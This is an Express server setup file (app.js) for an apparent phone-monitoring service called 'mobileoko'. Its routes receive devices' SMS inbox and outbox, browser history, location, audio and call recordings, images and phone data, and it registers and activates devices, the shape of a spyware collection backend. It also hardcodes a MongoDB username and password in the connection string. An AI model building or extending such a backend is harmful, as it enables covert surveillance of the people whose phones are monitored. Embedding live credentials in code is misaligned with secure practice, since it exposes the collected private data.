var createError = require('http-errors');
var express = require('express');
var path = require('path');
var cookieParser = require('cookie-parser');
var logger = require('morgan');
var socket_io = require("socket.io")
var bodyParser = require('body-parser')
var MongoClient = require('mongodb').MongoClient;

var indexRouter = require('./routes/custom/index');
var usersRouter = require('./routes/custom/users');
var getHistoryBrowser = require('./routes/custom/getHistoryBrowser');
var addHistoryBrowser = require('./routes/custom/addHistoryBrowser');
var uplaodSmsInbox = require('./routes/custom/uploadSmsInbox');
var uploadPhone = require('./routes/custom/uploadPhone');
var uploadLocation = require('./routes/custom/uploadLocation');
var uploadRecorder = require('./routes/custom/uploadRecorder');
var uploadImages = require('./routes/custom/uploadImages');
var uploadOutboxSms = require('./routes/custom/uploadSmsOutbox');
var registerUser = require('./routes/custom/registerUser');
var authUser = require('./routes/custom/authUser');
var addDivace = require('./routes/custom/addDivace');
var activateDivace = require('./routes/custom/activateDivace');




var app = express();
var io = socket_io();
app.io = io;

MongoClient.connect('mongodb://mobileoko:mobileOkoMongoPassword1928365720Jd@ds155299.mlab.com:55299/mobileoko', function (err, db) {
    if (err) {
        throw err;
    }

    app.use(function (req, res, next) {
        req.db = db.db("mobileoko");
        next();
    });

    var routes = require('./routes/custom/testSocket')(io);
    var socketAddHistoryBrowser = require('./routes/socket/socketAddHistoryBrowser')(io);
    var socketUploadSmsInbox = require('./routes/socket/socketUploadSmsInbox')(io);
    var socketUploadSmsOutbox = require('./routes/socket/soketUploadOutboxSms')(io);
    var socketUploadPhone = require('./routes/socket/socketUploadPhone')(io);
    var socketUploadLocation = require('./routes/socket/socketUploadLocation')(io);
    var socketUploadRecorder = require('./routes/socket/socketUploadRecorder')(io);
    var socketUploadImages = require('./routes/socket/socketUploadImages')(io);
    var socketUploadRecorderCall = require('./routes/socket/socketUploadRecorderCall')(io);
    var socketcreateFolders = require('./routes/socket/socketCreateFolders')(io);
    var testSoket = require('./routes/socket/soketTest')(io);


// view engine setup
    app.set('views', path.join(__dirname, 'views'));
    app.set('view engine', 'jade');

    app.use(logger('dev'));
    app.use(bodyParser.json());
    app.use(bodyParser.urlencoded({extended: false}));
    app.use(cookieParser());
    app.use(express.static(path.join(__dirname, 'public')));

    app.use('/', indexRouter);
    app.use('/users', usersRouter);
    app.use('/testSocket', routes);
    app.use('/api/mobileoko/getHistoryBrowser', getHistoryBrowser);
    app.use('/api/mobileoko/addHistoryBrowser', addHistoryBrowser);
    app.use('/api/soket/mobileoko/addHistoryBrowser',socketAddHistoryBrowser);
    app.use('/api/mobileoko/uplaodSmsInbox', uplaodSmsInbox);
    app.use('/api/socket/mobileoko/uploadSmsInbox',socketUploadSmsInbox);
    app.use('/api/mobileoko/uploadPhone',uploadPhone);
    app.use('/api/socket/mobileoko/uploadPhone',socketUploadPhone );
    app.use('/api/mobileoko/uploadLocation', uploadLocation);
    app.use('/api/socket/mobileoko/uploadLocation', socketUploadLocation);
    app.use('/api/mobileoko/uploadRecorder', uploadRecorder);
    app.use('/api/socket/mobileoko/socketUploadRecorder', socketUploadRecorder);
    app.use('/api/mobileoko/uploadImages', uploadImages);
    app.use('/api/socket/mobileoko/uploadImages', socketUploadImages);
    app.use('/api/mobileoko/uplaodSmsOutbox', uploadOutboxSms);
    app.use('/api/socket/mobileoko/uplaodSmsOutbox', socketUploadSmsOutbox);
    app.use('/api/socket/modileoko/socketUploadRecorderCall',socketUploadRecorderCall);
    app.use('/api/socket/mobileoko/createFolders',socketcreateFolders);
    app.use('/api/mobileoko/registerUser', registerUser);
    app.use('/api/mobileoko/authUser', authUser);
    app.use('/api/mobileoko/addDivace', addDivace);
    app.use('/api/mobileoko/activateDivace', activateDivace);




    app.use('/api/testSoket', testSoket);


// catch 404 and forward to error handler

    app.use(function (req, res, next) {
        next(createError(404));
    });


// error handler
    app.use(function (err, req, res, next) {
        // set locals, only providing error in development
        res.locals.message = err.message;
        res.locals.error = req.app.get('env') === 'development' ? err : {};

        // render the error page
        res.status(err.status || 500);
        res.render('error');


    });

// io.on( "connection", function( socket )
// {
//
// });
});


module.exports = app;
